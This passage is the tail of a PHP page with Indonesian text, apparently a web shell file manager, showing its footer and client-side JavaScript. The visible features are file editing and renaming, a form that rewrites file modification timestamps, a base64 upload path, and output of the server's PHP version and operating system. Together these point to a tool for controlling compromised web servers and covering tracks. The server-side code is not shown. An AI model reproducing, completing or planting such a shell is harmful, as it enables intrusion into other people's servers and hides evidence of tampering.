            echo '<div style="color:#888;font-size:12px;margin-top:10px;">🕐 Modified: ' . date('Y-m-d H:i:s', safeFilemtime($current_path)) . '</div>';
            echo '</div>';
        } else {
            echo '<div class="empty-state">❌ Path tidak ditemukan: ' . htmlspecialchars($current_path) . '</div>';
        }
        ?>
    </div>
    
    <div class="footer-info">
        👻 PHP <?php echo phpversion(); ?> | <?php echo php_uname('s'); ?>
    </div>
</div>

<script>
function toggleForm(id) {
    var el = document.getElementById(id);
    if (el.style.display === 'none' || el.style.display === '') {
        el.style.display = 'block';
        setTimeout(function() { el.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
    } else {
        el.style.display = 'none';
    }
}

function showRename(path, id) {
    document.querySelectorAll('.inline-form').forEach(function(f) { f.style.display = 'none'; });
    var form = document.getElementById('rename-form-' + id);
    if (form) {
        form.style.display = 'block';
        var inp = form.querySelector('input[name="new_name"]');
        if (inp) { inp.focus(); inp.select(); }
    }
}

function hideRename(id) {
    var form = document.getElementById('rename-form-' + id);
    if (form) form.style.display = 'none';
}

function showTouch(path, id, currentTime) {
    document.querySelectorAll('.inline-form').forEach(function(f) { f.style.display = 'none'; });
    var form = document.getElementById('touch-form-' + id);
    if (form) {
        form.style.display = 'block';
        var inp = form.querySelector('input[name="touch_time"]');
        if (inp && currentTime) {
            var date = new Date(currentTime * 1000);
            inp.value = date.getFullYear() + '-' + 
                String(date.getMonth() + 1).padStart(2, '0') + '-' + 
                String(date.getDate()).padStart(2, '0') + 'T' + 
                String(date.getHours()).padStart(2, '0') + ':' + 
                String(date.getMinutes()).padStart(2, '0');
            inp.focus();
        }
    }
}

function hideTouch(id) {
    var form = document.getElementById('touch-form-' + id);
    if (form) form.style.display = 'none';
}

function convertAndUploadBase64() {
    var fileInput = document.getElementById('base64FileInput');
    var file = fileInput.files[0];
    var status = document.getElementById('base64Status');
    
    if (!file) {
        status.innerHTML = '⚠️ Pilih file terlebih dahulu!';
        status.style.color = '#ff6b6b';
        return;
    }
    
    if (file.size > 50 * 1024 * 1024) {
        status.innerHTML = '❌ File terlalu besar! Maksimal 50MB';
        status.style.color = '#ff6b6b';
        return;
    }
    
    var filename = document.getElementById('base64Filename').value;
    if (!filename) {
        filename = file.name;
        document.getElementById('base64Filename').value = filename;
    }
    
    var progress = document.getElementById('base64Progress');
    var progressBar = document.getElementById('base64ProgressBar');
    
    status.innerHTML = '🔄 Mengkonversi file ke Base64...';
    status.style.color = '#ffd43b';
    progress.style.display = 'block';
    
    var reader = new FileReader();
    
    reader.onprogress = function(e) {
        if (e.lengthComputable) {
            var percent = Math.round((e.loaded / e.total) * 100);
            progressBar.style.width = percent + '%';
            status.innerHTML = '🔄 Membaca: ' + percent + '%';
        }
    };
    
    reader.onload = function(e) {
        progressBar.style.width = '100%';
        status.innerHTML = '📤 Mengirim data...';
        var base64Data = e.target.result.split(',')[1];
        document.getElementById('base64Data').value = base64Data;
        document.getElementById('base64UploadForm').submit();
    };
    
    reader.onerror = function() {
        status.innerHTML = '❌ Gagal membaca file!';
        status.style.color = '#ff6b6b';
    };
    
    reader.readAsDataURL(file);
}

document.addEventListener('DOMContentLoaded', function() {
    var urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('edit')) {
        var form = document.getElementById('edit-form');
        if (form) {
            form.style.display = 'block';
            setTimeout(function() { form.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 400);
        }
    }
    
    var fileInput = document.getElementById('base64FileInput');
    if (fileInput) {
        fileInput.addEventListener('change', function() {
            var filename = document.getElementById('base64Filename');
            if (!filename.value && this.files[0]) {
                filename.value = this.files[0].name;
            }
            var status = document.getElementById('base64Status');
            if (this.files[0]) {
                status.innerHTML = '📎 ' + this.files[0].name + ' (' + formatSize(this.files[0].size) + ')';
                status.style.color = '#51cf66';
            }
        });
    }
});

function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
    return (bytes / 1073741824).toFixed(1) + ' GB';
}

document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        var btn = document.querySelector('button[name="save_edit"]');
        if (btn) { e.preventDefault(); btn.click(); }
    }
});
</script>
</body>
</html>